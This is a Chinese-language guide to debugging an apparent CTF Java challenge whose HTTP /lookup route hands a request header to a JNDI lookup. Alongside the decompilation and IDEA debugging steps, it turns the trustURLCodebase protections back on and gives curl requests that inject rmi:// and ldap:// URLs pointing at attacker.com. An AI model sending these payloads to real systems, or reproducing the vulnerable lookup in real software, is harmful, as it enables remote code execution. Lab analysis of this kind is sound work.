# MHGA Jar 调试指南

## 1. 程序分析

### 1.1 基本信息
- **主类**: `challenge.Web`
- **打包方式**: Maven Assembly (Fat JAR)
- **JDK 版本**: 11
- **文件大小**: 24MB
- **文件数量**: 15,793 个

### 1.2 程序功能
程序启动一个 HTTP 服务器，监听 8000 端口，提供 `/lookup` 路由：

```
┌─────────────────────────────────────────────────────────────┐
│                      HTTP Server (Port 8000)                 │
├─────────────────────────────────────────────────────────────┤
│  POST /lookup                                                │
│  Headers: X-Lookup-URL: <jndi_url>                          │
│                                                              │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  InitialContext.lookup(X-Lookup-URL)                 │   │
│  │                                                     │   │
│  │  潜在攻击向量: RMI/LDAP 注入                         │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                              │
│  Response: "OK"                                              │
└─────────────────────────────────────────────────────────────┘
```

### 1.3 核心代码逻辑
```java
// 简化后的代码逻辑
public static void main(String[] args) throws Exception {
    HttpServer server = HttpServer.create();
    server.bind(new InetSocketAddress(8000), 0);

    server.createContext("/lookup", exchange -> {
        String url = exchange.getRequestHeaders()
                              .getFirst("X-Lookup-URL");

        try {
            new InitialContext().lookup(url);  // JNDI 注入点
        } catch (Exception e) {
            // 忽略异常
        }

        // 返回 "OK"
        exchange.sendResponseHeaders(200, 0);
        exchange.getResponseBody().write("OK".getBytes());
        exchange.close();
    });

    server.start();
}
```

## 2. IDEA 调试方案

由于这是一个 Assembly 打包的 Fat JAR，直接导入效果不佳。推荐以下方案：

### 方案 A: 反编译 + 重建项目（推荐）

#### 步骤 1: 提取并反编译

```bash
# 1. 创建工作目录
mkdir mhga-debug
cd mhga-debug

# 2. 提取 jar 内容
jar xf ../mhga.jar

# 3. 查看主类
```

#### 步骤 2: 创建 IDEA 项目

2. **创建源码文件**

```java
// src/main/java/challenge/Web.java
package challenge;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import javax.naming.InitialContext;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;

public class Web {

    public static void main(String[] args) throws Exception {
        System.out.println("[DEBUG] Starting HTTP Server on port 8000...");

        HttpServer server = HttpServer.create();
        server.bind(new InetSocketAddress(8000), 0);

        server.createContext("/lookup", new LookupHandler());

        server.start();
        System.out.println("[DEBUG] Server started. Listening on /lookup");
    }

    static class LookupHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            System.out.println("[DEBUG] Received request to /lookup");

            String url = exchange.getRequestHeaders().getFirst("X-Lookup-URL");
            System.out.println("[DEBUG] X-Lookup-URL: " + url);

            try {
                Object result = new InitialContext().lookup(url);
                System.out.println("[DEBUG] Lookup result: " + result);
            } catch (Exception e) {
                System.out.println("[DEBUG] Lookup failed: " + e.getClass().getName());
                e.printStackTrace();
            }

            exchange.sendResponseHeaders(200, 0);
            OutputStream os = exchange.getResponseBody();
            os.write("OK".getBytes());
            os.close();
        }
    }
}
```

#### 步骤 3: 在 IDEA 中调试

1. 打开项目
2. 在 `main` 方法右键 → "Debug 'Web.main()'"
3. 在关键位置设置断点：
   - `String url = ...` - 查看传入的 URL
   - `new InitialContext().lookup(url)` - 单步进入查看 JNDI 处理

### 方案 B: 直接调试原始 JAR（远程调试）

#### 步骤 1: 启动 JAR 并开启调试端口

```bash
java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 -jar mhga.jar
```

#### 步骤 2: 在 IDEA 中配置远程调试

1. **Run** → **Edit Configurations...**
2. 点击 **+** → **Remote JVM Debug**
3. 配置：
   - Name: `MHGA Remote Debug`
   - Host: `localhost`
   - Port: `5005`
4. 点击 "Debug" 按钮连接

#### 步骤 3: 添加源码

由于原始 JAR 没有源码，需要：
1. **方案 B1**: 按方案 A 创建源码项目，让 IDEA 自动关联
2. **方案 B2**: 使用反编译工具（如 CFR）生成源码

```bash
# 使用 CFR 反编译整个 jar
java -jar cfr.jar mhga.jar --outputdir src/
```

### 方案 C: 使用 IDEA 的 JAR 反编译功能

#### 步骤 1: 直接打开 JAR

1. **File** → **Project Structure** → **Libraries**
2. 点击 **+** → **Java**
3. 选择 `mhga.jar`
4. IDEA 会自动反编译（使用 FernFlower）

#### 步骤 2: 附加源码

1. 在反编译的类中，点击 "Download sources" 或 "Attach Sources..."
2. 如果有对应的源码 jar，可以关联

## 3. 调试技巧

### 3.1 查看 JNDI 查找过程

```java
// 在 lookup 前添加调试信息
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

// 启用 JNDI 跟踪
System.setProperty("com.sun.jndi.ldap.trace.ber", "System.out");
```

### 3.2 测试请求

```bash
# 测试正常请求
curl -X POST http://localhost:8000/lookup \
  -H "X-Lookup-URL: dns://8.8.8.8/example.com"

# 测试 RMI 注入（需要配合恶意 RMI 服务器）
curl -X POST http://localhost:8000/lookup \
  -H "X-Lookup-URL: rmi://attacker.com:1099/exploit"

# 测试 LDAP 注入
curl -X POST http://localhost:8000/lookup \
  -H "X-Lookup-URL: ldap://attacker.com:1389/exploit"
```

### 3.3 断点位置建议

| 位置 | 用途 |
|------|------|
| `Web.main()` 入口 | 验证程序启动 |
| `url = getFirst("X-Lookup-URL")` | 查看输入值 |
| `InitialContext().lookup(url)` 前 | 单步进入 JNDI |
| `catch (Exception e)` | 捕获并分析异常 |

## 4. 常见问题

### Q1: 找不到 com.sun.net.httpserver
**解决**: 这是 JDK 自带的，确保使用 JDK 11+

### Q2: JNDI lookup 失败
**检查**:
- JDK 版本（高版本需要设置信任属性）
- URL 格式是否正确
- 目标服务是否可达

### Q3: IDEA 无法连接远程调试
**检查**:
- JAR 是否以 debug 模式启动
- 防火墙是否阻止
- 端口是否正确
